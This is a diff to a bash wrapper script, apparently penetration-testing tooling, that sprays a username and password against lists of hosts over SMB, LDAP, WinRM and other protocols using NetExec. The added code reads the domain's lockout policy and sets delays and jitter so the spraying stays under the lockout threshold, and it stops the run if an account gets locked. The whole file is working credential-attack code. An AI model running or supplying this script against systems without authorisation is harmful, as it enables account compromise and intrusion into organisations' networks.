@@ -1,15 +1,20 @@
 #!/bin/bash
 
 # Usage:
-#   nxcspray <protocols|all> <targets> -u <username> -p <password>
+#   nxcspray <protocols|all> <targets> -u <username> -p <password> [options]
+#
+# Options:
+#   --dc IP        Auto-detect safe delay from AD password policy (recommended)
+#   --delay N      Manual delay in seconds between attempts (overrides --dc)
+#   --jitter N     Manual jitter in seconds added randomly to delay (overrides --dc)
 #
 # Examples:
-#   nxcspray all 10.10.10.10 -u bob -p password
-#   nxcspray smb,ldap,winrm hosts.txt -u bob -p password
+#   nxcspray all hosts.txt -u bob -p password --dc 172.16.116.10
+#   nxcspray smb,winrm hosts.txt -u bob -p password --delay 30 --jitter 10
 
 # ---- Argument Validation ----
 if [ "$#" -lt 4 ]; then
-    echo "[-] Usage: $0 <protocols|all> <targets> -u <username> -p <password>"
+    echo "[-] Usage: $0 <protocols|all> <targets> -u <username> -p <password> [--dc IP] [--delay N] [--jitter N]"
     exit 1
 fi
 
@@ -19,13 +24,21 @@ shift 2
 
 USER=""
 PASS=""
+DELAY=0
+JITTER=0
+DC_IP=""
+MANUAL_DELAY=false
+MANUAL_JITTER=false
 
-while getopts "u:p:" opt; do
-    case $opt in
-        u) USER="$OPTARG" ;;
-        p) PASS="$OPTARG" ;;
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -u) USER="$2"; shift 2 ;;
+        -p) PASS="$2"; shift 2 ;;
+        --dc) DC_IP="$2"; shift 2 ;;
+        --delay) DELAY="$2"; MANUAL_DELAY=true; shift 2 ;;
+        --jitter) JITTER="$2"; MANUAL_JITTER=true; shift 2 ;;
         *)
-            echo "[-] Invalid flag"
+            echo "[-] Unknown flag: $1"
             exit 1
             ;;
     esac
@@ -34,6 +47,48 @@ done
 if [ -z "$USER" ] || [ -z "$PASS" ]; then
     echo "[-] Missing required flags: -u <username> -p <password>"
     exit 1
+fi
+
+# ---- Auto-detect delay from AD password policy ----
+if [ -n "$DC_IP" ]; then
+    echo "[*] Querying AD password policy from $DC_IP..."
+    POLICY=$(nxc smb "$DC_IP" -u "$USER" -p "$PASS" --pass-pol 2>/dev/null)
+
+    THRESHOLD=$(echo "$POLICY" | grep -i "Lockout Threshold" | grep -oP '\d+' | tail -1)
+    OBS_WIN=$(echo "$POLICY" | grep -i "Lockout Observation Window" | grep -oP '\d+' | tail -1)
+
+    if [ -z "$THRESHOLD" ] || [ -z "$OBS_WIN" ]; then
+        echo "[!] Could not parse password policy — falling back to manual delay values."
+    elif [ "$THRESHOLD" -eq 0 ]; then
+        echo "[+] Lockout Threshold: 0 (no lockout policy) — delay not required."
+    else
+        echo "[+] Lockout Threshold : $THRESHOLD attempts"
+        echo "[+] Observation Window: $OBS_WIN minutes"
+
+        # Safe attempts = threshold - 1 (leave 1 buffer)
+        SAFE_ATTEMPTS=$(( THRESHOLD - 1 ))
+        OBS_WIN_SEC=$(( OBS_WIN * 60 ))
+
+        # Interval = observation_window / safe_attempts, with 10% safety buffer
+        AUTO_DELAY=$(( (OBS_WIN_SEC / SAFE_ATTEMPTS) * 110 / 100 ))
+        AUTO_JITTER=$(( AUTO_DELAY * 15 / 100 ))
+
+        # Only override if user didn't set manually
+        if ! $MANUAL_DELAY; then
+            DELAY=$AUTO_DELAY
+            echo "[+] Auto delay set to : ${DELAY}s"
+        else
+            echo "[~] Manual --delay override: ${DELAY}s (auto would be ${AUTO_DELAY}s)"
+        fi
+
+        if ! $MANUAL_JITTER; then
+            JITTER=$AUTO_JITTER
+            echo "[+] Auto jitter set to: ${JITTER}s (±${JITTER}s random)"
+        else
+            echo "[~] Manual --jitter override: ${JITTER}s (auto would be ${AUTO_JITTER}s)"
+        fi
+    fi
+    echo ""
 fi
 
 # ---- Protocol Handling ----
@@ -50,12 +105,44 @@ else
     TARGETS="$TARGETS_RAW"
 fi
 
+ACCOUNT_LOCKED=false
+
 # ---- Spray Loop ----
 for PROTO in "${PROTO_ARRAY[@]}"; do
+    if $ACCOUNT_LOCKED; then
+        echo "[!] Account locked detected — stopping spray."
+        break
+    fi
+
     echo "[+] Spraying protocol: $PROTO"
 
     for TARGET in $TARGETS; do
         echo "    -> Target: $TARGET"
-        nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS"
+
+        OUTPUT=$(nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" 2>&1)
+        echo "$OUTPUT"
+
+        # Detect lockout
+        if echo "$OUTPUT" | grep -qiE "ACCOUNT_LOCKED|STATUS_ACCOUNT_LOCKED_OUT|account.*locked"; then
+            echo ""
+            echo "[!] WARNING: Account '$USER' is LOCKED OUT on $TARGET ($PROTO) — aborting all further spraying."
+            ACCOUNT_LOCKED=true
+            break
+        fi
+
+        # Apply delay + jitter
+        if [ "$DELAY" -gt 0 ] || [ "$JITTER" -gt 0 ]; then
+            SLEEP_TIME=$DELAY
+            if [ "$JITTER" -gt 0 ]; then
+                RAND=$(( RANDOM % (JITTER + 1) ))
+                SLEEP_TIME=$(( DELAY + RAND ))
+            fi
+            echo "    [~] Sleeping ${SLEEP_TIME}s before next attempt..."
+            sleep "$SLEEP_TIME"
+        fi
     done
 done
+
+if $ACCOUNT_LOCKED; then
+    exit 2
+fi
